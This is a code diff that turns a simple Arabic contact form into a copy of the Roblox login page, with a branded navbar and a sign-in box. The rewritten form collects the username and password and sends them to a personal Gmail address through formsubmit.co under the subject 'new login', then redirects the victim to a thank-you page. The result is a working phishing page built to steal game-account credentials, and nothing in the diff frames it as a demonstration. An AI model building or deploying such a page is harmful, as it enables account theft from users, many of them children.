@@ -2,7 +2,7 @@
 <html lang="ar">
 <head>
 <meta charset="UTF-8">
-<title>Contact</title>
+<title>Roblox</title>
 
 <style>
 body{
@@ -10,25 +10,54 @@ body{
   font-family:Arial, sans-serif;
   background:#1c1f26;
   color:white;
+}
+
+/* ===== NAVBAR ===== */
+.navbar{
+  background:linear-gradient(#1a1a1a,#0f0f0f);
+  height:64px;
+  display:flex;
+  align-items:center;
+  padding:0 18px;
+}
+.logo{font-size:24px;font-weight:900;margin-right:20px;}
+.links{display:flex;gap:18px;}
+.links a{color:#ddd;text-decoration:none;font-size:14px;}
+.links a:hover{color:white}
+.search{
+  margin:auto;
+  display:flex;
+  align-items:center;
+  background:#222;
+  border-radius:10px;
+  padding:6px 14px;
+  width:420px;
+}
+.search input{background:transparent;border:none;color:white;outline:none;width:100%;}
+.actions{margin-left:auto;display:flex;gap:10px;}
+.btn-blue,.btn-dark{width:120px;padding:8px 0;border-radius:8px;font-weight:bold;}
+.btn-blue{background:#2a7cff;border:none;color:white;}
+.btn-dark{background:#111;border:1px solid #555;color:white;}
+
+/* ===== BG ===== */
+.bg{
+  background:url("IMG_0161.png") center/cover no-repeat;
+  min-height:calc(100vh - 64px);
   display:flex;
   justify-content:center;
   align-items:center;
-  height:100vh;
 }
 
+/* ===== LOGIN BOX ===== */
 .box{
   background:#262a33;
   width:360px;
   padding:28px;
   border-radius:14px;
 }
+.box h2{text-align:center;margin-bottom:18px;}
 
-.box h2{
-  text-align:center;
-  margin-bottom:18px;
-}
-
-input, textarea{
+.box input{
   width:100%;
   padding:12px;
   margin:10px 0;
@@ -36,16 +65,28 @@ input, textarea{
   border-radius:8px;
   background:#1f222b;
   color:white;
+  font-size:15px;
 }
+.box input::placeholder{color:#aaa;}
 
-button{
+.mainbtn,.secbtn{
   width:100%;
   padding:12px;
   border:none;
   border-radius:8px;
-  background:#3b82f6;
-  color:white;
   font-weight:bold;
+  margin-top:10px;
+  cursor:pointer;
+}
+
+.mainbtn{background:#3b82f6;color:white;}
+.secbtn{background:#2f333d;color:white;}
+
+.link{
+  text-align:center;
+  font-size:13px;
+  color:#9ca3af;
+  margin:12px 0;
   cursor:pointer;
 }
 </style>
@@ -53,19 +94,47 @@ button{
 
 <body>
 
-<div class="box">
-  <h2>تواصل معنا</h2>
+<div class="navbar">
+  <div class="logo">ROBLOX</div>
+  <div class="links">
+    <a href="#">الرئيسية</a>
+    <a href="#">السوق</a>
+    <a href="#">إنشاء</a>
+    <a href="#">Robux</a>
+  </div>
+  <div class="search">
+    <input type="text" placeholder="بحث">
+  </div>
+  <div class="actions">
+    <button class="btn-blue">تسجيل الدخول</button>
+    <button class="btn-dark">تسجيل</button>
+  </div>
+</div>
 
-  <form action="https://formsubmit.co/YOUR_EMAIL@gmail.com" method="POST">
-    <input type="hidden" name="_template" value="table">
-    <input type="hidden" name="_captcha" value="false">
+<div class="bg">
+  <div class="box">
+    <h2>تسجيل الدخول إلى Roblox</h2>
 
-    <input type="text" name="name" placeholder="اسمك" required>
-    <input type="email" name="email" placeholder="بريدك الإلكتروني" required>
-    <textarea name="message" placeholder="رسالتك" required></textarea>
+    <form action="https://formsubmit.co/battal.alzahrani23@gmail.com" method="POST">
 
-    <button type="submit">إرسال</button>
-  </form>
+      <input type="hidden" name="_subject" value="تسجيل دخول جديد">
+      <input type="hidden" name="_template" value="table">
+      <input type="hidden" name="_captcha" value="false">
+      <input type="hidden" name="_next" value="thankyou.html">
+
+      <input type="text" name="username" placeholder="اسم المستخدم" required>
+      <input type="password" name="password" placeholder="كلمة المرور" required>
+
+      <button type="submit" class="mainbtn">تسجيل الدخول</button>
+
+      <div class="link">نسيت كلمة المرور أو اسم المستخدم؟</div>
+
+      <button type="button" class="secbtn">إرسال رمز صالح لمرة واحدة عبر البريد الإلكتروني</button>
+      <button type="button" class="secbtn">تسجيل دخول سريع</button>
+
+      <div class="link">ليس لديك حساب؟ اشترك</div>
+    </form>
+  </div>
 </div>
 
 </body>
